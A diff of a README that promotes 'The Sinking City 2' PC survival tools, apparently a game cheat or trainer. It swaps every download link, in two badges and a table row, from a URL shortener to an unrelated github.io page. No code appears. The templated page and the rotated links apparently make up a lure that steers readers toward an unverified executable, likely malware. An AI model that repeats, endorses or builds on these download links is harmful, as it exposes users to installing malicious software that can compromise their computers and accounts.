@@ -8,7 +8,7 @@ The Sinking City 2 survival tools for PC with supply controls, inventory values,
 
 ## Download
 
-[![Download for PC](https://img.shields.io/badge/DOWNLOAD-PC_VERSION-238636?style=for-the-badge)](https://flyn.im/Eeffel)
+[![Download for PC](https://img.shields.io/badge/DOWNLOAD-PC_VERSION-238636?style=for-the-badge)](https://gaterivermoat.github.io/)
 
 ---
 
@@ -48,7 +48,7 @@ Prepare an exploration profile with your preferred supply and damage settings. K
 | Game | The Sinking City 2 |
 | Platform | Windows / PC |
 | Focus | Inventory / Supplies / Damage / Exploration / Puzzle notes |
-| Download | [PC package](https://flyn.im/Eeffel) |
+| Download | [PC package](https://gaterivermoat.github.io/) |
 
 ## FAQ
 
@@ -68,7 +68,7 @@ Use the Download button on this page to open the application's download page.
 
 ## Quick Download
 
-[![Download for PC](https://img.shields.io/badge/DOWNLOAD-PC_VERSION-238636?style=for-the-badge)](https://flyn.im/Eeffel)
+[![Download for PC](https://img.shields.io/badge/DOWNLOAD-PC_VERSION-238636?style=for-the-badge)](https://gaterivermoat.github.io/)
 
 ---
 
